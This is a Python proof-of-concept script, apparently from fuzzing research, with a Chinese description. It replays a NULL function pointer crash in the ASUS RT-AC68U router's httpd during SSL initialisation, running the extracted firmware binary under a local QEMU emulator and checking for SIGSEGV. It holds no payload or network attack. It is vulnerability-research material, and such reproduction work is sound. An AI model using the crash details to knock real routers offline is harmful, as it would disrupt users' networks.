#!/usr/bin/env python3
"""
PoC: ASUS RT-AC68U httpd — NULL Function Pointer (SSL Init)
CVE Candidate: RR-FUZZ-AS68U-01

漏洞描述:
  httpd 在 SSL 初始化阶段（ssl_init）调用了一个未初始化的函数指针。
  触发路径: nvram读取 https_crt_gen → heap分配 → /dev/urandom读取
           → gettimeofday时间回调 → BX NULL → SIGSEGV

影响版本: ASUS RT-AC68U firmware 3.0.0.4.380_7743 (httpd)
触发条件: 无需网络交互，httpd 启动时自动触发（特定 NVRAM 配置下）
崩溃类型: PC = 0x00000000 (ARM BX/BLX through null function pointer)
复现次数: 1600+ (持续增长，模糊测试中)

Usage:
    python3 poc_rtac68u_null_fptr.py [--verify]
"""
import subprocess
import os
import sys

QEMU   = '/home/webfuzz/Documents/qemu/build/qemu-arm'
ROOTFS = '/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/verified_targets/Asus_RTAC68U/rootfs'
TRACE  = '/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/seeds/Asus_RTAC68U.trace'

def run_poc():
    print("[*] ASUS RT-AC68U httpd NULL Function Pointer PoC")
    print(f"[*] Target : {ROOTFS}/usr/sbin/httpd")
    print(f"[*] Trace  : {TRACE}")
    print()

    env = os.environ.copy()
    env.update({
        'RR_FUZZING_ENABLED': '1',
        'RR_MODE':            'fuzzing',
        'RR_TRACE_FILE':      TRACE,
        'QEMU_LD_PREFIX':     ROOTFS,
        'RR_DEBUG_LEVEL':     'warn',
        'RR_SHARED_MEMORY':   'none',   # no SHM needed for plain PoC
    })

    try:
        result = subprocess.run(
            [QEMU, '-L', ROOTFS, f'{ROOTFS}/usr/sbin/httpd'],
            env=env,
            capture_output=True,
            timeout=10
        )
        stderr = result.stderr.decode('utf-8', errors='replace')
        if 'signal 11' in stderr or 'Segmentation fault' in stderr:
            print("[!!!] CRASH CONFIRMED — SIGSEGV at PC=0x0")
            print(f"      Exit code : {result.returncode}")
            # Find crash line
            for line in stderr.splitlines():
                if 'signal' in line.lower() or 'fault' in line.lower():
                    print(f"      QEMU      : {line}")
            return True
        else:
            print(f"[?] No crash detected. Exit={result.returncode}")
            print(f"    stderr: {stderr[:200]}")
            return False
    except subprocess.TimeoutExpired:
        print("[!] Timeout — binary may be waiting for connection")
        print("    Hint: run with RR fuzzing conductor for proper replay")
        return False

if __name__ == '__main__':
    run_poc()
